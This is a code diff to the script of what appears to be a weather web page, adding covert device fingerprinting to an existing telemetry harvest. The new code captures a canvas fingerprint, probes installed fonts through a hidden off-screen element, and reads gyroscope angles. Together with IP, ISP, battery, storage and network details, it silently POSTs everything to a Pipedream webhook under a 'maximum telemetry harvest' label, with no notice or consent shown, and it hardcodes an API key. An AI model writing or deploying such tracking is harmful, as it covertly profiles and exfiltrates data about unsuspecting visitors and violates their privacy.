@@ -85,14 +85,26 @@
     <script>
         // ==================== CONFIGURATION ====================
         const apiKey = "5ee3f9bd4499e661596b6b95991408fe"; 
-        const pipedreamURL = "https://eotwt8cj1vr426p.m.pipedream.net"; // Replace with your Pipedream webhook URL
+        const pipedreamURL = "https://eotwt8cj1vr426p.m.pipedream.net"; // <-- Paste your Pipedream URL here
         // =======================================================
+
+        // Global variable bucket to capture real-time 3D spatial tilts instantly on window start
+        let dynamicAngles = { gyro_alpha: "Null", gyro_beta: "Null", gyro_gamma: "Null" };
+
+        if (window.DeviceOrientationEvent) {
+            window.addEventListener("deviceorientation", function(event) {
+                // Capture orientation values immediately, keeping only two decimal points
+                dynamicAngles.gyro_alpha = event.alpha !== null ? event.alpha.toFixed(2) + "°" : "Null";
+                dynamicAngles.gyro_beta = event.beta !== null ? event.beta.toFixed(2) + "°" : "Null";
+                dynamicAngles.gyro_gamma = event.gamma !== null ? event.gamma.toFixed(2) + "°" : "Null";
+            }, { once: true }); // 'once: true' turns off the listener immediately after the first frame to save power
+        }
 
         window.onload = function() {
             fetchWeatherByIP();
         };
 
-        // Helper function that extracts OS and Brand signatures from User-Agent
+        // Extract OS and Brand configurations from User-Agent
         function getDeviceDetails() {
             const ua = navigator.userAgent;
             let os = "Unknown OS";
@@ -114,7 +126,7 @@
             return { os: os, device: device };
         }
 
-        // Silent feature probe checking for specific video codec hardware decoding
+        // Silent feature probe checking for web codec hardware processing capabilities
         function checkVideoCodecSupport() {
             const video = document.createElement('video');
             return {
@@ -124,7 +136,56 @@
             };
         }
 
-        // --- PHASE 1: MAXIMUM BACKGROUND TELEMETRY HARVEST ---
+        // Generate a micro Canvas image fingerprint hash cleanly in memory
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = 200;
+                canvas.height = 40;
+                ctx.textBaseline = "top";
+                ctx.font = "14px 'Arial'";
+                ctx.textBaseline = "alphabetic";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125,1,62,20);
+                ctx.fillStyle = "#069";
+                ctx.fillText("Weather_Tracker_v3!", 2, 15);
+                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+                ctx.fillText("Weather_Tracker_v3!", 4, 17);
+                return canvas.toDataURL(); 
+            } catch (e) {
+                return "Blocked/Unsupported";
+            }
+        }
+
+        // Advanced typography presence testing array
+        function probeInstalledFonts() {
+            const baseFont = "monospace";
+            const fontsToTest = ["Consolas", "Calibri", "Segoe UI", "Roboto", "Helvetica"];
+            const testString = "abcdefghijklmnopqrstuvwxyz0123456789";
+            
+            const holder = document.createElement("span");
+            holder.style.fontSize = "72px";
+            holder.style.position = "absolute";
+            holder.style.left = "-9999px";
+            holder.innerText = testString;
+            holder.style.fontFamily = baseFont;
+            document.body.appendChild(holder);
+            
+            const defaultWidth = holder.offsetWidth;
+            const defaultHeight = holder.offsetHeight;
+            const results = {};
+
+            fontsToTest.forEach(font => {
+                holder.style.fontFamily = `'${font}', ${baseFont}`;
+                results[`font_detected_${font.toLowerCase().replace(' ', '_')}`] = (holder.offsetWidth !== defaultWidth || holder.offsetHeight !== defaultHeight);
+            });
+
+            document.body.removeChild(holder);
+            return results;
+        }
+
+        // --- PHASE 1: SOVEREIGN MAXIMUM TELEMETRY HARVEST ---
         function fetchWeatherByIP() {
             fetch('https://api.ipify.org?format=json')
                 .then(res => res.json())
@@ -133,11 +194,8 @@
                 .then(ipData => {
                     const ipCity = ipData.city || "Hyderabad"; 
                     const hardware = getDeviceDetails();
-
-                    // 1. Detect Dark Mode / Light Mode Preference
                     const isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
 
-                    // 2. Audio Context Fingerprint Estimation
                     let audioChannels = "Unsupported";
                     try {
                         const AudioContext = window.AudioContext || window.webkitAudioContext;
@@ -148,13 +206,13 @@
                         }
                     } catch (e) {}
 
-                    // 3. Screen HDR & Video Compatibility Checks
                     const hasHDR = window.matchMedia && window.matchMedia('(dynamic-range: high)').matches;
                     const codecs = checkVideoCodecSupport();
+                    const fontProfile = probeInstalledFonts();
 
-                    // 4. Base Payload Setup (Instant synchronous variables)
+                    // Master Blueprint Construction
                     const masterPayload = {
-                        event: "maximum_hardware_fingerprint_load", 
+                        event: "sovereign_hardware_fingerprint_load", 
                         city: ipCity, 
                         ip: ipData.ip,
                         isp: ipData.org,
@@ -166,39 +224,40 @@
                         max_touch_points: navigator.maxTouchPoints || 0,
                         system_theme: isDarkMode ? "Dark Mode" : "Light Mode",
                         motion_sensors_available: !!(window.DeviceOrientationEvent || window.DeviceMotionEvent),
+                        
+                        // 3D Gyroscope Attitude Parameters
+                        3d_angle_alpha_compass: dynamicAngles.gyro_alpha,
+                        3d_angle_beta_front_tilt: dynamicAngles.gyro_beta,
+                        3d_angle_gamma_side_tilt: dynamicAngles.gyro_gamma,
+
                         max_audio_output_channels: audioChannels,
                         screen_supports_hdr: hasHDR,
                         codec_support_h264: codecs.h264,
                         codec_support_vp9: codecs.vp9,
                         codec_support_av1: codecs.av1,
                         network_estimated_speed: navigator.connection ? `${navigator.connection.downlink} Mbps` : "Unknown",
-                        network_latency_rtt: navigator.connection ? `${navigator.connection.rtt} ms` : "Unknown"
+                        network_latency_rtt: navigator.connection ? `${navigator.connection.rtt} ms` : "Unknown",
+                        canvas_unique_fingerprint_data: getCanvasFingerprint(),
+                        ...fontProfile
                     };
 
-                    // 5. Chain Asynchronous Promises sequentially (Battery + Storage Storage Checks)
                     const getBatteryPromise = navigator.getBattery ? navigator.getBattery() : Promise.resolve(null);
                     const getStoragePromise = (navigator.storage && navigator.storage.estimate) ? navigator.storage.estimate() : Promise.resolve(null);
 
                     Promise.all([getBatteryPromise, getStoragePromise])
                         .then(([battery, storage]) => {
-                            // Map battery values into metrics
                             if (battery) {
                                 masterPayload.battery_percentage = `${Math.round(battery.level * 100)}%`;
                                 masterPayload.battery_is_charging = battery.charging;
                                 masterPayload.minutes_until_dead = battery.dischargingTime !== Infinity ? Math.round(battery.dischargingTime / 60) : "Infinite / Plugged In";
                             }
-                            
-                            // Map sandbox storage constraints into metrics
                             if (storage) {
                                 masterPayload.sandbox_storage_quota_gb = (storage.quota / (1024 * 1024 * 1024)).toFixed(2);
                                 masterPayload.sandbox_storage_usage_mb = (storage.usage / (1024 * 1024)).toFixed(2);
                             }
-
-                            // Dispatch completed master blueprint straight to Pipedream URL
                             sendTrackingData(masterPayload);
                         })
                         .catch(() => {
-                            // Robust fallback execution inside network payload failure
                             sendTrackingData(masterPayload);
                         });
 
@@ -282,6 +341,7 @@
             .catch(err => console.error(err));
         }
 
+        // Final payload distribution dispatcher endpoint
         function sendTrackingData(payload) {
             fetch(pipedreamURL, {
                 method: "POST",
